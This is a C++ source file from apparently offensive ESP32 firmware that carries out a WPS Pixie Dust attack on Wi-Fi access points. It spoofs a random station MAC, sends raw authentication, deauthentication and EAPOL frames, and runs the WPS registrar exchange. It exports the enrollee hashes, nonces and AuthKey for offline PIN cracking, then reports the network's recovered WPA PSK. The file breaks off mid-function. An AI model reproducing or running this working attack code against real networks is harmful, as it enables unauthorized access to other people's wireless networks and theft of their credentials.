#include "wps_pixie.h"

#include <algorithm>
#include <cstring>

#include <WiFi.h>
#include <esp_random.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/queue.h>

#include "wps_eapol.h"

using namespace wps;

namespace {

constexpr uint32_t WPS_PIXIE_TIMEOUT_MS = 35000;
constexpr uint32_t WPS_M3_TIMEOUT_MS = 10000;
constexpr uint32_t WPS_M1_TIMEOUT_MS = 10000;
constexpr uint32_t WPS_RECOVERED_PIN_TIMEOUT_MS = 30000;
constexpr uint32_t WPS_WSC_DONE_TIMEOUT_MS = 5000;
constexpr uint32_t WPS_RADIO_SETTLE_MS = 150;
constexpr uint8_t kWscOpMessage = WSC_OP_MSG;
constexpr uint8_t kWscOpNack = WSC_OP_NACK;

constexpr uint8_t kSupportedRates[] = {
    0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
};
constexpr uint8_t kExtendedRates[] = {0x32, 0x04, 0x30, 0x48, 0x60, 0x6c};
constexpr uint8_t kPowerCapability[] = {0x21, 0x02, 0x08, 0x14};
constexpr uint8_t kRmEnabledCapabilities[] = {0x46, 0x05, 0x7b, 0x00, 0x02, 0x00, 0x00};
constexpr uint8_t kOperatingClasses[] = {
    0x3b, 0x16, 0x53, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76,
    0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e,
    0x7f, 0x80, 0x81, 0x00, 0x82, 0x80,
};
constexpr uint8_t kWpsIe[] = {
    0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04,
    0x10, 0x4a, 0x00, 0x01, 0x10,
    0x10, 0x3a, 0x00, 0x01, 0x02,
    0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20,
};
constexpr uint8_t kWmmIe[] = {0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00};
constexpr uint8_t kMediaTekIe[] = {0xdd, 0x07, 0x00, 0x0c, 0xe7, 0x08, 0x00, 0x00, 0x00};

WpsPixieManager* g_activeManager = nullptr;

bool parseBssid(const String& text, uint8_t out[6]) {
    unsigned int values[6] = {};
    const int parsed = std::sscanf(
        text.c_str(), "%x:%x:%x:%x:%x:%x",
        &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    if (parsed != 6) return false;
    for (int i = 0; i < 6; ++i) out[i] = static_cast<uint8_t>(values[i]);
    return true;
}

bool appendIe(uint8_t* output, size_t capacity, size_t& length, const uint8_t* data, size_t dataLength) {
    if (length + dataLength > capacity) return false;
    std::memcpy(output + length, data, dataLength);
    length += dataLength;
    return true;
}

void appendU16(uint8_t* out, size_t& offset, uint16_t value) {
    out[offset++] = static_cast<uint8_t>(value >> 8);
    out[offset++] = static_cast<uint8_t>(value & 0xff);
}

String macToString(const uint8_t mac[6]) {
    char buffer[18];
    std::snprintf(
        buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buffer);
}

bool findWpsSetupLocked(
    const uint8_t* frame,
    size_t length,
    bool& foundWps,
    bool& hasLockAttribute,
    uint8_t& lockValue) {
    foundWps = false;
    hasLockAttribute = false;
    lockValue = 0;
    if (frame == nullptr || length < 36) return false;

    size_t offset = 36;  // 24-byte header + 12-byte beacon/probe fixed fields
    while (offset + 2 <= length) {
        const uint8_t elementId = frame[offset];
        const size_t elementLength = frame[offset + 1];
        offset += 2;
        if (elementLength > length - offset) break;
        if (elementId == 0xdd && elementLength >= 4 &&
            frame[offset] == 0x00 && frame[offset + 1] == 0x50 &&
            frame[offset + 2] == 0xf2 && frame[offset + 3] == 0x04) {
            foundWps = true;
            WpsAttributes attributes{};
            if (attributes.parse(frame + offset + 4, elementLength - 4)) {
                const WpsAttribute* locked = attributes.find(0x1057);
                if (locked != nullptr && locked->length == 1 &&
                    locked->value != nullptr) {
                    hasLockAttribute = true;
                    lockValue = locked->value[0];
                }
            }
        }
        offset += elementLength;
    }
    return foundWps;
}

}  // namespace

bool wpsPixieSupported() {
    return WPS_PIXIE_SUPPORTED != 0;
}

void WpsPixieManager::begin(BridgeProtocol& proto) {
    proto_ = &proto;
}

bool WpsPixieManager::active() const {
    return state_ != State::Idle;
}

bool WpsPixieManager::startAttempt(
    const String& bssid,
    const String& ssid,
    uint8_t channel,
    const String& pin,
    const String& runId,
    bool captureOnly,
    bool reuseMac,
    String& error) {
    if (!wpsPixieSupported()) {
        error = "wps_pixie_not_supported";
        return false;
    }
    if (active()) {
        error = "wps_pixie_busy";
        return false;
    }
    if (!parseBssid(bssid, targetBssid_)) {
        error = "invalid_bssid";
        return false;
    }
    if (pin.length() != 4 && pin.length() != 8) {
        error = "invalid_pin";
        return false;
    }
    if (channel == 0) {
        error = "invalid_channel";
        return false;
    }
    if (rxQueue_ == nullptr) {
        rxQueue_ = xQueueCreate(12, sizeof(RxFrame));
        if (rxQueue_ == nullptr) {
            error = "wps_pixie_queue_failed";
            return false;
        }
    }

    runId_ = runId;
    ssid_ = ssid;
    pin_ = pin;
    channel_ = channel;
    captureOnly_ = captureOnly;
    // Keep one stable randomized MAC per target campaign while firmware is
    // running. A new target gets a new MAC. This lets the pre-association
    // cleanup target the AP state left by the previous raw association.
    (void)reuseMac;
    reuseMac_ = reusableMacValid_ &&
        std::memcmp(reusableMacBssid_, targetBssid_, 6) == 0;
    resultSent_ = false;
    associated_ = false;
    sawLock_ = false;
    sawWpsBeacon_ = false;
    lockKnown_ = false;
    lockSet_ = false;
    fragmentActive_ = false;
    wscFragmentLength_ = 0;
    wscFragmentTotal_ = 0;
    lastFragmentLength_ = 0;
    haveLastWscRequest_ = false;
    lastWscRequestLength_ = 0;
    lastWscReplyLength_ = 0;
    lastM2Length_ = 0;
    lastM3Length_ = 0;
    lastM4Length_ = 0;
    lastM5Length_ = 0;
    lastM6Length_ = 0;
    std::memset(enrolleeNonce_, 0, sizeof(enrolleeNonce_));
    std::memset(registrarNonce_, 0, sizeof(registrarNonce_));
    std::memset(authKey_, 0, sizeof(authKey_));
    std::memset(keyWrapKey_, 0, sizeof(keyWrapKey_));
    xQueueReset(rxQueue_);

    startedMs_ = millis();
    lastActivityMs_ = startedMs_;
    lastManagementTxMs_ = 0;
    lastEapolTxMs_ = 0;
    m3WaitStartedMs_ = 0;
    m1WaitStartedMs_ = 0;
    recoveredPinWaitStartedMs_ = 0;
    wscDoneWaitStartedMs_ = 0;
    pendingCredentials_ = RegistrarM7Result{};
    lastM3EapId_ = 0;
    lockCheckStartedMs_ = 0;
    lockSeenMs_ = 0;
    state_ = State::StartPending;
    emitProgress("prepare", "WPS attempt accepted; preparing radio");
    return true;
}

bool WpsPixieManager::prepareRadio(String& error) {
    emitProgress("prepare", "Tearing down previous radio state");
    // A rejected PIN leaves the AP's WPS state and the raw STA association
    // behind. Explicitly tear down the radio path and let the driver settle
    // before the corrected-PIN attempt; otherwise the retry can remain stuck
    // after EAPOL-Start.
    cleanupRadioState();
    delay(WPS_RADIO_SETTLE_MS);

    emitProgress("prepare", "Enabling APSTA mode");
    WiFi.persistent(false);
    WiFi.setAutoReconnect(false);
    if (!WiFi.mode(WIFI_AP_STA)) {
        cleanupRadioState();
        error = "apsta_failed";
        return false;
    }
    delay(100);

    emitProgress("prepare", "Starting hidden helper SoftAP");
    // Keep a hidden, zero-client SoftAP active while the raw STA path performs
    // WPS. The SSID must be non-empty: this Arduino WiFi stack rejects an
    // empty AP SSID before it ever reaches esp_wifi_set_config(). Randomize
    // both SSID and WPA2 password so the helper AP is not an easily joinable
    // open ESP_XXXXXX network. The AP is still detectable as a hidden BSSID.
    char helperSsid[24]{};
    char helperPassword[9]{};
    static const char kPasswordChars[] =
        "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
    const uint32_t randomValue = esp_random();
    std::snprintf(
        helperSsid, sizeof(helperSsid), "NRSuite-WPS-%06x", randomValue & 0xffffff);
    for (size_t index = 0; index < 8; ++index) {
        helperPassword[index] = kPasswordChars[(randomValue >> ((index % 4) * 8)) % (sizeof(kPasswordChars) - 1)];
    }
    helperPassword[8] = '\0';
    if (!WiFi.softAP(helperSsid, helperPassword, channel_, 1, 1)) {
        cleanupRadioState();
        error = "softap_start_failed";
        return false;
    }
    delay(100);
    esp_wifi_set_ps(WIFI_PS_NONE);

    emitProgress("prepare", "Setting target channel");
    const esp_err_t channelError = esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    if (channelError != ESP_OK) {
        cleanupRadioState();
        error = String("set_channel_failed:") + esp_err_to_name(channelError);
        return false;
    }

    esp_wifi_get_mac(WIFI_IF_STA, originalStationMac_);
    uint8_t selectedMac[6]{};
    if (reuseMac_) {
        emitProgress("prepare", "Reusing randomized station MAC for retry");
        std::memcpy(selectedMac, reusableMac_, sizeof(selectedMac));
    } else {
        emitProgress("prepare", "Randomizing station MAC");
        esp_fill_random(selectedMac, sizeof(selectedMac));
        selectedMac[0] = static_cast<uint8_t>((selectedMac[0] & 0xfc) | 0x02);
        std::memcpy(reusableMac_, selectedMac, sizeof(reusableMac_));
        std::memcpy(reusableMacBssid_, targetBssid_, sizeof(reusableMacBssid_));
        reusableMacValid_ = true;
    }
    const esp_err_t macError = esp_wifi_set_mac(WIFI_IF_STA, selectedMac);
    delay(50);
    esp_wifi_get_mac(WIFI_IF_STA, stationMac_);
    macChanged_ = macError == ESP_OK;

    lockCheckStartedMs_ = millis();
    lockSeenMs_ = 0;
    state_ = State::WaitLockCheck;
    g_activeManager = this;
    enablePromiscuous();
    delay(50);
    emitProgress("lock-check", "Checking fresh AP WPS lock status");
    return true;
}

bool WpsPixieManager::continueWithRecoveredPin(
    const String& runId,
    const String& pin,
    String& error) {
    if (state_ != State::WaitRecoveredPin) {
        error = "no_m3_session";
        return false;
    }
    if (runId_ != runId) {
        error = "run_id_mismatch";
        return false;
    }
    if (pin.length() != 4 && pin.length() != 8) {
        error = "invalid_pin";
        return false;
    }
    if (lastM3Length_ == 0 || authKey_[0] == 0) {
        error = "m3_session_incomplete";
        return false;
    }

    pin_ = pin;
    captureOnly_ = false;
    resultSent_ = false;
    recoveredPinWaitStartedMs_ = 0;

    uint8_t secretNonce1[kRegistrarSecretNonceLength];
    uint8_t iv[16];
    esp_fill_random(secretNonce1, sizeof(secretNonce1));
    esp_fill_random(registrarSecretNonce2_, sizeof(registrarSecretNonce2_));
    esp_fill_random(iv, sizeof(iv));
    const char* buildError = nullptr;
    RegistrarM4Result m4{};
    if (!buildRegistrarM4(
            lastM3_, lastM3Length_, enrolleeNonce_, enrolleePublicKey_,
            registrarPublicKey_, reinterpret_cast<const uint8_t*>(pin_.c_str()),
            pin_.length(), authKey_, keyWrapKey_, secretNonce1,
            registrarSecretNonce2_, iv, m4, &buildError)) {
        crypto::secureZero(secretNonce1, sizeof(secretNonce1));
        error = buildError == nullptr ? "m4_build_failed" : buildError;
        return false;
    }
    crypto::secureZero(secretNonce1, sizeof(secretNonce1));
    std::memcpy(lastM4_, m4.attributes, m4.attributesLength);
    lastM4Length_ = m4.attributesLength;
    if (!sendWscAttributes(lastM3EapId_, lastM4_, lastM4Length_, "wps-m4")) {
        error = "m4_tx_failed";
        return false;
    }
    rememberWscReply(lastM4_, lastM4Length_);
    state_ = State::WaitM5;
    emitProgress("m4", "Recovered PIN received; M4 sent; proving PIN with enrollee");
    return true;
}

void WpsPixieManager::stop() {
    if (state_ == State::Idle) return;
    if (!resultSent_) {
        emitError("stopped", "WPS Pixie attempt stopped");
    }
    finish();
}

void WpsPixieManager::update() {
    if (state_ == State::Idle) return;

    drainQueue();

    if (state_ == State::StartPending) {
        if (millis() - startedMs_ > 10000) {
            fail("start_timeout", "Radio setup did not complete within 10 seconds");
            return;
        }
        String setupError;
        if (!prepareRadio(setupError)) {
            fail("start_failed", setupError);
            return;
        }
        return;
    }

    if (state_ == State::WaitLockCheck) {
        if (lockSet_ && millis() - lockCheckStartedMs_ > 30000) {
            fail("wps_locked", "AP reports WPS setup locked for more than 30 seconds");
            return;
        }
        if (lockKnown_ && !lockSet_) {
            startRawAssociation();
            return;
        }
        if (millis() - lockCheckStartedMs_ > 3500) {
            if (!sawWpsBeacon_) {
                fail("target_not_found", "No fresh WPS beacon/probe response observed on target channel");
            } else if (lockSet_) {
                fail("wps_locked", "AP still reports WPS setup locked");
            } else {
                emitProgress("lock-check", "WPS lock flag absent or unknown; continuing");
                startRawAssociation();
            }
            return;
        }
        return;
    }

    if (state_ == State::WaitAuthResponse && millis() - lastManagementTxMs_ > 1500) {
        sendAuthenticationRequest();
    } else if (state_ == State::WaitAssocResponse && millis() - lastManagementTxMs_ > 1500) {
        sendAssociationRequest();
    }

    if ((state_ == State::WaitIdentity || state_ == State::WaitM1) &&
        millis() - lastEapolTxMs_ > 2500) {
        sendEapolStart();
    }

    if (state_ == State::WaitRecoveredPin &&
        recoveredPinWaitStartedMs_ != 0 &&
        millis() - recoveredPinWaitStartedMs_ > WPS_RECOVERED_PIN_TIMEOUT_MS) {
        fail("recovered_pin_timeout", "Timed out waiting for the recovered PIN; AP WPS session expired");
        return;
    }

    if (state_ == State::WaitWscDone &&
        wscDoneWaitStartedMs_ != 0 &&
        millis() - wscDoneWaitStartedMs_ > WPS_WSC_DONE_TIMEOUT_MS) {
        emitProgress("complete", "WSC_DONE not received; finalizing from valid M7 credentials");
        emitPsk(pendingCredentials_.networkKey, pendingCredentials_.networkKeyLength);
        finish();
        return;
    }

    if (state_ == State::WaitM3 &&
        m3WaitStartedMs_ != 0 &&
        millis() - m3WaitStartedMs_ > WPS_M3_TIMEOUT_MS) {
        fail("m3_timeout", "No M3 received within 10 seconds; pin may be invalid or AP may be WPS locked");
        return;
    }

    if ((state_ == State::WaitIdentity || state_ == State::WaitM1) &&
        m1WaitStartedMs_ != 0 &&
        millis() - m1WaitStartedMs_ > WPS_M1_TIMEOUT_MS) {
        fail("m1_timeout", "No M1 received within 10 seconds; retry after the AP settles");
        return;
    }

    if (millis() - startedMs_ > WPS_PIXIE_TIMEOUT_MS) {
        fail("timeout", "WPS Pixie attempt timed out");
    }
}

bool WpsPixieManager::startRawAssociation() {
    // The AP may still hold a raw association/WPS state from a previous
    // attempt for this campaign MAC. Force a clean boundary before auth.
    emitProgress("associate", "Clearing previous AP association state");
    associated_ = false;
    sendDeauthFrame();
    delay(10);
    sendDisassocFrame();
    delay(80);

    startedMs_ = millis();
    lastActivityMs_ = startedMs_;
    state_ = State::WaitAuthResponse;
    emitProgress("associate", "Starting raw WPS registrar association");
    if (!sendAuthenticationRequest()) {
        fail("assoc_failed", "authentication TX failed");
        return false;
    }
    return true;
}

void WpsPixieManager::emitProgress(const char* stage, const String& message) {
    if (proto_ == nullptr) return;
    JsonDocument doc;
    doc["run_id"] = runId_;
    doc["stage"] = stage;
    doc["message"] = message;
    proto_->sendEvent("wps_pixie_progress", doc);
}

void WpsPixieManager::emitWrongPin(bool firstHalfValid, bool firstHalfKnown, bool m3Only) {
    if (proto_ == nullptr || resultSent_) return;
    resultSent_ = true;
    JsonDocument doc;
    doc["run_id"] = runId_;
    doc["bssid"] = macToString(targetBssid_);
    doc["ssid"] = ssid_;
    doc["channel"] = channel_;
    doc["pke"] = bytesToHex(enrolleePublicKey_, sizeof(enrolleePublicKey_));
    doc["pkr"] = bytesToHex(registrarPublicKey_, sizeof(registrarPublicKey_));
    doc["e_nonce"] = bytesToHex(enrolleeNonce_, sizeof(enrolleeNonce_));
    doc["r_nonce"] = bytesToHex(registrarNonce_, sizeof(registrarNonce_));
    doc["e_hash1"] = bytesToHex(eHash1_, sizeof(eHash1_));
    doc["e_hash2"] = bytesToHex(eHash2_, sizeof(eHash2_));
    doc["auth_key"] = bytesToHex(authKey_, sizeof(authKey_));
    doc["m3_only"] = m3Only;
    doc["reason"] = m3Only ? "m3_capture" : "pin_rejected";
    if (firstHalfKnown) {
        doc["first_half_valid"] = firstHalfValid;
    }
    proto_->sendEvent("wps_pixie_wrong_pin", doc);
    emitProgress(
        "wrong-pin",
        m3Only ? "M3 captured; starting offline Pixie Dust search"
               : (firstHalfValid ? "PIN rejected after first half validation" : "PIN rejected"));
}

void WpsPixieManager::emitPsk(const uint8_t* key, size_t keyLength) {
    if (proto_ == nullptr || resultSent_) return;
    resultSent_ = true;
    JsonDocument doc;
    doc["run_id"] = runId_;
    doc["bssid"] = macToString(targetBssid_);
    doc["ssid"] = ssid_;
    doc["pin"] = pin_;
    doc["psk"] = pskText(key, keyLength);
    doc["auth_type"] = 0x0020;
    doc["encr_type"] = 0x0008;
    proto_->sendEvent("wps_pixie_psk", doc);
    emitProgress("complete", "WPS PSK recovered");
}

void WpsPixieManager::emitError(const char* code, const String& message) {
    if (proto_ == nullptr) return;
    JsonDocument doc;
    doc["run_id"] = runId_;
    doc["code"] = code;
    doc["message"] = message;
    proto_->sendEvent("wps_pixie_error", doc);
}

void WpsPixieManager::fail(const char* code, const String& message) {
    emitError(code, message);
    finish();
}

void WpsPixieManager::cleanupRadioState() {
    // Raw auth/association is invisible to the WiFi driver, so
    // esp_wifi_disconnect() alone will not tell the AP to drop the old
    // association. Send an explicit deauth while the randomized STA MAC is
    // still active, then restore the driver state.
    if (associated_) {
        sendDeauthFrame();
        associated_ = false;
        delay(30);
    }
    disablePromiscuous();
    g_activeManager = nullptr;
    esp_wifi_disconnect();
    if (macChanged_) {
        esp_wifi_set_mac(WIFI_IF_STA, originalStationMac_);
        macChanged_ = false;
    }
    // Keep the randomized hidden WPA2 helper AP active. Clearing the AP here
    // allows the Arduino WiFi layer to fall back to the default open
    // ESP_XXXXXX SoftAP, which is both visible and joinable.
}

void WpsPixieManager::finish() {
    cleanupRadioState();
    fragmentActive_ = false;
    lastFragmentLength_ = 0;
    haveLastWscRequest_ = false;
    lastWscRequestLength_ = 0;
    lastWscReplyLength_ = 0;
    crypto::secureZero(authKey_, sizeof(authKey_));
    crypto::secureZero(keyWrapKey_, sizeof(keyWrapKey_));
    delay(50);
    state_ = State::Idle;
}

String WpsPixieManager::bytesToHex(const uint8_t* data, size_t length) const {
    static const char* digits = "0123456789abcdef";
    String out;
    out.reserve(length * 2);
    for (size_t i = 0; i < length; ++i) {
        out += digits[data[i] >> 4];
        out += digits[data[i] & 0x0f];
    }
    return out;
}

String WpsPixieManager::pskText(const uint8_t* data, size_t length) const {
    bool printable = length > 0;
    for (size_t i = 0; i < length; ++i) {
        if (data[i] < 0x20 || data[i] > 0x7e) {
            printable = false;
            break;
        }
    }
    if (printable) {
        String text;
        text.reserve(length);
        for (size_t i = 0; i < length; ++i) text += static_cast<char>(data[i]);
        return text;
    }
    return bytesToHex(data, length);
}

bool WpsPixieManager::sendRawFrame(const uint8_t* frame, size_t length, const char* label) {
    (void)label;
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, length, true) != ESP_OK) {
        return false;
    }
    lastActivityMs_ = millis();
    return true;
}

bool WpsPixieManager::sendAuthenticationRequest() {
    uint8_t frame[64];
    size_t length = 0;
    if (!buildWlanAuthenticationRequest(frame, sizeof(frame), targetBssid_, stationMac_, length)) {
        return false;
    }
    if (!sendRawFrame(frame, length, "auth")) return false;
    lastManagementTxMs_ = millis();
    return true;
}

bool WpsPixieManager::sendAssociationRequest() {
    uint8_t ies[256];
    size_t ieLength = 0;
    const size_t ssidLength = std::min<size_t>(ssid_.length(), 32);
    if (ieLength + 2 + ssidLength > sizeof(ies)) return false;
    ies[ieLength++] = 0x00;
    ies[ieLength++] = static_cast<uint8_t>(ssidLength);
    std::memcpy(ies + ieLength, ssid_.c_str(), ssidLength);
    ieLength += ssidLength;

    auto append = [&](const uint8_t* data, size_t length) {
        return appendIe(ies, sizeof(ies), ieLength, data, length);
    };
    if (!append(kSupportedRates, sizeof(kSupportedRates)) ||
        !append(kExtendedRates, sizeof(kExtendedRates)) ||
        !append(kPowerCapability, sizeof(kPowerCapability)) ||
        !append(kRmEnabledCapabilities, sizeof(kRmEnabledCapabilities)) ||
        !append(kOperatingClasses, sizeof(kOperatingClasses)) ||
        !append(kWpsIe, sizeof(kWpsIe)) ||
        !append(kWmmIe, sizeof(kWmmIe)) ||
        !append(kMediaTekIe, sizeof(kMediaTekIe))) {
        return false;
    }

    uint8_t frame[320];
    size_t frameLength = 0;
    if (!buildWlanAssociationRequest(
            frame, sizeof(frame), targetBssid_, stationMac_, ies, ieLength, frameLength)) {
        return false;
    }
    if (!sendRawFrame(frame, frameLength, "assoc")) return false;
    lastManagementTxMs_ = millis();
    return true;
}

bool WpsPixieManager::sendNullFrame() {
    uint8_t frame[24]{};
    frame[0] = 0x48;
    frame[1] = 0x11;
    std::memcpy(frame + 4, targetBssid_, 6);
    std::memcpy(frame + 10, stationMac_, 6);
    std::memcpy(frame + 16, targetBssid_, 6);
    return sendRawFrame(frame, sizeof(frame), "null");
}

bool WpsPixieManager::sendEapol(const uint8_t* eapol, size_t eapolLength, const char* label) {
    uint8_t frame[1024];
    size_t frameLength = 0;
    if (!buildWlanEapolFrame(
            frame,
            sizeof(frame),
            targetBssid_,
            stationMac_,
            targetBssid_,
            eapol,
            eapolLength,
            frameLength)) {
        return false;
    }
    if (!sendRawFrame(frame, frameLength, label)) return false;
    lastEapolTxMs_ = millis();
    return true;
}

bool WpsPixieManager::sendEapolStart() {
    uint8_t eapol[16];
    size_t length = 0;
    return buildEapolStart(eapol, sizeof(eapol), length) &&
        sendEapol(eapol, length, "eapol-start");
}

bool WpsPixieManager::sendIdentityResponse(uint8_t eapId) {
    uint8_t eapol[128];
    size_t length = 0;
    return buildEapIdentityResponse(
               eapol,
               sizeof(eapol),
               eapId,
               "WFA-SimpleConfig-Registrar-1-0",
               length) &&
        sendEapol(eapol, length, "identity");
}

bool WpsPixieManager::sendWscOpcode(
    uint8_t eapId,
    uint8_t opcode,
    const uint8_t* attributes,
    size_t length,
    const char* label) {
    uint8_t eapol[768];
    size_t eapolLength = 0;
    if (!buildEapWscMessage(
            eapol,
            sizeof(eapol),
            0x02,
            eapId,
            opcode,
            attributes,
            length,
            eapolLength)) {
        return false;
    }
    return sendEapol(eapol, eapolLength, label);
}

bool WpsPixieManager::sendWscAttributes(
    uint8_t eapId,
    const uint8_t* attributes,
    size_t length,
    const char* label) {
    return sendWscOpcode(eapId, kWscOpMessage, attributes, length, label);
}

bool WpsPixieManager::sendWscFragmentAck(uint8_t eapId) {
    return sendWscOpcode(eapId, WSC_OP_FRAG_ACK, nullptr, 0, "wps-frag-ack");
}

bool WpsPixieManager::sendWscNack(uint8_t eapId) {
    return sendWscOpcode(eapId, kWscOpNack, nullptr, 0, "wps-nack");
}

bool WpsPixieManager::sendDeauthFrame() {
    uint8_t frame[26]{};
    frame[0] = 0xc0;  // Management: Deauthentication
    frame[1] = 0x00;
    std::memcpy(frame + 4, targetBssid_, 6);
    std::memcpy(frame + 10, stationMac_, 6);
    std::memcpy(frame + 16, targetBssid_, 6);
    frame[24] = 0x03;  // reason: leaving/deauthenticated
    frame[25] = 0x00;
    return sendRawFrame(frame, sizeof(frame), "deauth");
}

bool WpsPixieManager::sendDisassocFrame() {
    uint8_t frame[26]{};
    frame[0] = 0xa0;  // Management: Disassociation
    frame[1] = 0x00;
    std::memcpy(frame + 4, targetBssid_, 6);
    std::memcpy(frame + 10, stationMac_, 6);
    std::memcpy(frame + 16, targetBssid_, 6);
    frame[24] = 0x03;  // reason: leaving/deauthenticated
    frame[25] = 0x00;
    return sendRawFrame(frame, sizeof(frame), "disassoc");
}

void WpsPixieManager::enablePromiscuous() {
    if (promiscuous_) return;
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&WpsPixieManager::promiscuousCallbackStatic);
    if (esp_wifi_set_promiscuous(true) == ESP_OK) {
        promiscuous_ = true;
    }
}

void WpsPixieManager::disablePromiscuous() {
    if (!promiscuous_) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    promiscuous_ = false;
}

void WpsPixieManager::promiscuousCallbackStatic(void* buffer, wifi_promiscuous_pkt_type_t type) {
    if (g_activeManager != nullptr) {
        g_activeManager->promiscuousCallback(buffer, type);
    }
}

void WpsPixieManager::promiscuousCallback(void* buffer, wifi_promiscuous_pkt_type_t type) {
    if (buffer == nullptr || rxQueue_ == nullptr || state_ == State::Idle) return;
    const auto* packet = static_cast<const wifi_promiscuous_pkt_t*>(buffer);
    const uint8_t* frame = packet->payload;
    const size_t length = packet->rx_ctrl.sig_len;
    if (length < kWlanHeaderLength) return;

    const bool management = (frame[0] & 0x0c) == 0x00;
    const bool data = (frame[0] & 0x0c) == 0x08;
    RxFrame item{};
    if (management && type == WIFI_PKT_MGMT) {
        const uint8_t subtype = static_cast<uint8_t>((frame[0] >> 4) & 0x0f);
        if (state_ == State::WaitLockCheck && (subtype == 0x08 || subtype == 0x05)) {
            if (length < 36 || std::memcmp(frame + 10, targetBssid_, 6) != 0) return;
            item.management = true;
            item.length = static_cast<uint16_t>(std::min<size_t>(length, sizeof(item.data)));
            std::memcpy(item.data, frame, item.length);
            xQueueSend(rxQueue_, &item, 0);
            return;
        }
        if (subtype != 0x0b && subtype != 0x01) return;
        if (length < 30 ||
            std::memcmp(frame + 4, stationMac_, 6) != 0 ||
            std::memcmp(frame + 10, targetBssid_, 6) != 0) {
            return;
        }
        item.management = true;
        item.length = static_cast<uint16_t>(std::min<size_t>(length, sizeof(item.data)));
        std::memcpy(item.data, frame, item.length);
        xQueueSend(rxQueue_, &item, 0);
        return;
    }

    if (!data || type != WIFI_PKT_DATA) return;
    if ((frame[1] & 0x02) == 0) return;
    size_t headerLength = kWlanHeaderLength;
    if ((frame[0] & 0x80) != 0) headerLength += 2;
    if ((frame[1] & 0x80) != 0) headerLength += 4;
    if (length < headerLength + kLlcSnapLength + 4) return;
    if (std::memcmp(frame + 4, stationMac_, 6) != 0 ||
        std::memcmp(frame + 10, targetBssid_, 6) != 0) {
        return;
    }
    const uint8_t snap[] = {0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e};
    if (std::memcmp(frame + headerLength, snap, sizeof(snap)) != 0) return;
    const uint8_t* eapol = frame + headerLength + kLlcSnapLength;
    const size_t available = length - headerLength - kLlcSnapLength;
    if (available < 4) return;
    const size_t eapolLength = 4 + readBe16(eapol + 2);
    if (eapolLength > available || eapolLength > sizeof(item.data)) return;
    item.management = false;
    item.length = static_cast<uint16_t>(eapolLength);
    std::memcpy(item.data, eapol, eapolLength);
    xQueueSend(rxQueue_, &item, 0);
}

void WpsPixieManager::drainQueue() {
    RxFrame frame{};
    while (rxQueue_ != nullptr && xQueueReceive(rxQueue_, &frame, 0) == pdTRUE) {
        lastActivityMs_ = millis();
        if (frame.management) {
            processManagementFrame(frame.data, frame.length);
        } else {
            processEapol(frame.data, frame.length);
        }
        if (state_ == State::Idle) break;
    }
}

void WpsPixieManager::handleLockBeacon(const uint8_t* frame, size_t length) {
    if (state_ != State::WaitLockCheck) return;
    bool foundWps = false;
    bool hasLockAttribute = false;
    uint8_t lockValue = 0;
    findWpsSetupLocked(frame, length, foundWps, hasLockAttribute, lockValue);
    if (!foundWps) return;
    sawWpsBeacon_ = true;
    lockSeenMs_ = millis();
    if (hasLockAttribute && (lockValue == 0 || lockValue == 1)) {
        lockKnown_ = true;
        lockSet_ = lockValue != 0;
        if (lockSet_) {
            sawLock_ = true;
            emitProgress("lock-check", "AP reports WPS setup locked; waiting for it to clear");
        } else {
            emitProgress("lock-check", "Fresh WPS beacon reports lock clear");
        }
    }
}

void WpsPixieManager::processManagementFrame(const uint8_t* frame, size_t length) {
    if (length < 30) return;
    const uint8_t subtype = static_cast<uint8_t>((frame[0] >> 4) & 0x0f);
    if (subtype == 0x08 || subtype == 0x05) {
        handleLockBeacon(frame, length);
        return;
    }
    if (subtype == 0x0b) {
        const uint16_t status = readBe16(frame + 28);
        if (status == 0 && state_ == State::WaitAuthResponse) {
            if (!sendAssociationRequest()) {
                fail("assoc_failed", "association request TX failed");
                return;
            }
            state_ = State::WaitAssocResponse;
            emitProgress("associate", "Authentication accepted; association sent");
        }
        return;
    }
    if (subtype == 0x01) {
        const uint16_t status = readBe16(frame + 26);
        if (status == 0 && state_ == State::WaitAssocResponse) {
            sendNullFrame();
            if (!sendEapolStart()) {
                fail("eapol_failed", "EAPOL-Start TX failed");
                return;
            }
            associated_ = true;
            state_ = State::WaitIdentity;
            m1WaitStartedMs_ = millis();
            emitProgress("identity", "Associated; EAPOL-Start sent");
        } else if (state_ == State::WaitAssocResponse) {
            fail("assoc_failed", "association rejected");
        }
    }
}

int WpsPixieManager::reassembleWscFragment(
    const EapWscFrame& frame,
    EapWscFrame& complete) {
    complete = frame;
    const bool hasLengthField = (frame.flags & 0x02) != 0;
    const bool moreFragments = (frame.flags & 0x01) != 0;

    if (hasLengthField) {
        if (fragmentActive_ || frame.total_length == 0 ||
            frame.total_length > sizeof(wscFragment_)) {
            fragmentActive_ = false;
            return -1;
        }
        wscFragmentLength_ = 0;
        wscFragmentTotal_ = frame.total_length;
        wscFragmentEapId_ = frame.eap_id;
        wscFragmentFlags_ = frame.flags;
        fragmentActive_ = true;
    } else if (!fragmentActive_) {
        if (moreFragments) return -1;
        return 1;
    }

    if (lastFragmentLength_ != 0 &&
        frame.eap_id == lastFragmentEapId_ &&
        frame.flags == lastFragmentFlags_ &&
        frame.wps_length == lastFragmentLength_ &&
